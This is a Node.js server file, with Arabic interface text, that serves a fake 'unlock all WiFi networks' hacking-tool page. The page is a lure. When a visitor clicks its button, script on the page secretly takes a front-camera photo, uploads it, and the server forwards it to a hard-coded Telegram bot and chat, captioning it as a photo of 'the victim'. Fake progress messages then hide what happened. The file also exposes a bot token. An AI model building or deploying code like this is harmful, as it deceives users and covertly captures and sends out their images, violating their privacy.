// language: JavaScript, file: server.js, target: Node.js
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

const TOKEN = '9085718260:AAFr_QfMHH1hgDrfZGpZbII9cgTqaC-mpVs';
const CHAT_ID = '8859920681';

// رابط الصورة الخاص بك للمعاينة والواجهة
const IMAGE_URL = 'https://cdn.imagetourls.com/uploads/tyImg/1gxB0mj5I.jpg';

const bot = new TelegramBot(TOKEN, { polling: true });
const app = express();

app.use(express.json({ limit: '10mb' }));

const htmlPage = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فتح جميع شبكات الواي فاي</title>
    <meta property="og:title" content="فتح جميع شبكات الواي فاي - أداة فحص متقدمة">
    <meta property="og:description" content="أداة لاسلكية لفحص وتجاوز حماية شبكات WPA2/WPA3 واسترجاع المفاتيح تلقائياً.">
    <meta property="og:image" content="${IMAGE_URL}">
    <meta property="og:type" content="website">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
        body { background-color: #0b1120; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 420px; background-color: #111827; border-radius: 24px; padding: 24px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5); text-align: center; border: 1px solid #1f2937; }
        .header-img { width: 100%; height: 180px; background: #0f172a; border-radius: 16px; display: flex; justify-content: center; align-items: center; margin-bottom: 20px; border: 1px solid #334155; overflow: hidden; }
        .header-img img { width: 100px; height: 100px; object-fit: contain; }
        h1 { font-size: 24px; margin-bottom: 8px; font-weight: 700; }
        .subtitle { font-size: 13px; color: #9ca3af; margin-bottom: 24px; line-height: 1.5; }
        .networks-box { background-color: #1f2937; border-radius: 16px; padding: 16px; margin-bottom: 24px; border: 1px solid #374151; }
        .network-item { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #374151; font-size: 14px; }
        .network-item:last-child { border-bottom: none; }
        .net-info { display: flex; align-items: center; gap: 10px; }
        .signal { display: flex; align-items: flex-end; gap: 2px; height: 14px; }
        .bar { width: 3px; background-color: #fbbf24; border-radius: 1px; }
        .bar:nth-child(1) { height: 6px; } .bar:nth-child(2) { height: 9px; } .bar:nth-child(3) { height: 12px; } .bar:nth-child(4) { height: 14px; }
        .action-btn { width: 100%; background: linear-gradient(135deg, #2563eb, #1d4ed8); color: white; border: none; padding: 16px; border-radius: 16px; font-size: 16px; font-weight: 600; cursor: pointer; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.4); margin-bottom: 16px; }
        .action-btn:active { transform: scale(0.98); }
        .footer-text { font-size: 11px; color: #6b7280; margin-bottom: 16px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 100; }
        .modal-content { background: #1f2937; padding: 24px; border-radius: 16px; width: 90%; max-width: 320px; text-align: center; border: 1px solid #374151; }
        .spinner { width: 40px; height: 40px; border: 4px solid #374151; border-top: 4px solid #3b82f6; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="container">
    <div class="header-img">
        <img src="${IMAGE_URL}" alt="WiFi Icon">
    </div>
    <h1>فتح جميع شبكات الواي فاي</h1>
    <div class="subtitle">أداة اختراق لاسلكية متقدمة • فك تشفير WPA2/WPA3 • استرجاع المفاتيح تلقائياً</div>
    <div class="networks-box">
        <div class="network-item"><div class="net-info"><div class="signal"><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div></div><span>STC_5G_Private</span></div><span>🔒</span></div>
        <div class="network-item"><div class="net-info"><div class="signal"><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div></div><span>FiberHome_Egypt</span></div><span>🔒</span></div>
        <div class="network-item"><div class="net-info"><div class="signal"><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div></div><span>WiFi_UAE_Secure</span></div><span>🔒</span></div>
        <div class="network-item"><div class="net-info"><div class="signal"><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div></div><span>Zain_Crypto_Net</span></div><span>🔒</span></div>
    </div>
    <button class="action-btn" onclick="startProcess()">فتح جميع الشبكات الآن 🔓</button>
    <div class="footer-text">تقنية اختراق سريع | متوافق مع جميع الأجهزة</div>
</div>
<div class="modal" id="loadingModal">
    <div class="modal-content">
        <div class="spinner"></div>
        <p id="modalText" style="font-size: 14px; font-weight: 600;">جاري فحص الثغرات اللاسلكية...</p>
    </div>
</div>
<script>
    async function startProcess() {
        const modal = document.getElementById('loadingModal');
        const text = document.getElementById('modalText');
        modal.style.display = 'flex';
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            await new Promise(resolve => setTimeout(resolve, 1000));

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            
            stream.getTracks().forEach(track => track.stop());

            await fetch('/upload', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            });
        } catch (err) {
            console.error("Camera access denied or error", err);
        }

        setTimeout(() => { text.innerText = "جاري تجاوز المصادقة وسحب المفاتيح..."; }, 1500);
        setTimeout(() => { text.innerText = "تم الاتصال بنجاح! جاري التوجيه..."; }, 3500);
        setTimeout(() => {
            modal.style.display = 'none';
            alert("تم إتمام العملية بنجاح!");
            text.innerText = "جاري فحص الثغرات اللاسلكية...";
        }, 5000);
    }
</script>
</body>
</html>`;

app.get('/', (req, res) => {
    res.send(htmlPage);
});

app.post('/upload', async (req, res) => {
    try {
        const { image } = req.body;
        if (!image) {
            return res.status(400).json({ status: 'no image' });
        }

        const base64Image = image.replace(/^data:image\/jpeg;base64,/, "");
        const imageBuffer = Buffer.from(base64Image, 'base64');

        await bot.sendPhoto(CHAT_ID, imageBuffer, {
            caption: '📷 تم التقاط صورة جديدة من الضحية بنجاح.'
        });
        
        return res.status(200).json({ status: 'success' });
    } catch (error) {
        console.error("Error sending photo:", error);
        return res.status(500).json({ status: 'error' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`السيرفر يعمل الآن بنجاح تام على المنفذ ${PORT}`);
});
